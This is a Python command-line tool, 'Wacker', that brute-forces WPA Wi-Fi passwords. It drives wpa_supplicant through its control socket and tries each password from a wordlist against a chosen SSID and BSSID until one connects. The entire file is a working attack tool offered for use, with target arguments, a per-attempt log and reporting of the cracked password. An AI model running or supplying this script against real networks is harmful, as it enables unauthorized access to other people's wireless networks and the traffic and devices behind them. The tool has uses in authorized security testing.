#!/usr/bin/env python3

import os
import socket
import subprocess
import time
import argparse
from datetime import datetime

class Wacker:
    def __init__(self, iface, bssid, ssid, freq, wordlist, debug=False):
        self.iface = iface
        self.bssid = bssid
        self.ssid = ssid
        self.freq = freq
        self.password_file = wordlist
        self.debug = debug

        self.ctrl_interface = "/var/run/wpa_supplicant"
        self.me = f"/tmp/wacker/wpa_ctrl_{self.iface}"
        self.they = f"{self.ctrl_interface}/{self.iface}"
        self.sock = None
        self.running = True
        self.start_time = None
        self.stop_time = None
        self.password_attempts = 0

    def log(self, message):
        print(f"[+] {message}")

    def debug_log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")

    def create_uds_endpoints(self):
        if os.path.exists(self.me):
            os.unlink(self.me)
        if not os.path.exists("/tmp/wacker"):
            os.makedirs("/tmp/wacker")
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.sock.bind(self.me)
        self.debug_log(f"Socket bound to {self.me}")

    def connect_to_wpa_supplicant(self):
        self.debug_log(f"Connecting to wpa_supplicant socket at {self.they}")
        self.sock.connect(self.they)

    def send_cmd(self, cmd):
        try:
            self.sock.send(cmd.encode())
            resp = self.sock.recv(4096).decode().strip()
            self.debug_log(f"Command: {cmd} | Response: {resp}")
            return resp
        except Exception as e:
            self.log(f"Error sending command: {e}")
            return ""

    def try_password(self, password):
        self.send_cmd("REMOVE_NETWORK all")
        net_id = self.send_cmd("ADD_NETWORK")
        self.send_cmd(f'SET_NETWORK {net_id} ssid "\\"{self.ssid}\\""')
        self.send_cmd(f'SET_NETWORK {net_id} psk "\\"{password}\\""')
        self.send_cmd(f'SET_NETWORK {net_id} bssid {self.bssid}')
        self.send_cmd(f"ENABLE_NETWORK {net_id}")
        self.send_cmd("SAVE_CONFIG")
        self.send_cmd("RECONNECT")

        self.password_attempts += 1
        self.log(f"Trying password #{self.password_attempts}: {password}")
        time.sleep(0.1)

        status = self.send_cmd("STATUS")
        if "wpa_state=COMPLETED" in status:
            self.log(f"Password found: {password}")
            return True

        return False

    def run(self):
        self.log("Starting wpa_supplicant...")
        self.start_time = datetime.now()
        self.log(f"Start time: {self.start_time.strftime('%d %b %Y %H:%M:%S')}")

        try:
            self.create_uds_endpoints()
            self.connect_to_wpa_supplicant()

            with open(self.password_file, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if not self.running:
                        break

                    password = line.strip()
                    if not password:
                        continue

                    success = self.try_password(password)
                    if success:
                        break

        except KeyboardInterrupt:
            self.log("Interrupted by user.")
        finally:
            self.stop_time = datetime.now()
            self.log(f"Stop time: {self.stop_time.strftime('%d %b %Y %H:%M:%S')}")
            self.log(f"Stopped at password attempt: {self.password_attempts}")

            try:
                self.sock.close()
            except:
                pass

            if os.path.exists(self.me):
                os.unlink(self.me)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wacker WPA Brute Forcer")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface")
    parser.add_argument("-b", "--bssid", required=True, help="Target BSSID")
    parser.add_argument("-s", "--ssid", required=True, help="Target SSID")
    parser.add_argument("-f", "--frequency", required=True, help="Channel frequency (e.g. 2412)")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    args = parser.parse_args()

    wacker = Wacker(
        iface=args.interface,
        bssid=args.bssid,
        ssid=args.ssid,
        freq=args.frequency,
        wordlist=args.wordlist,
        debug=args.debug
    )
    wacker.run()
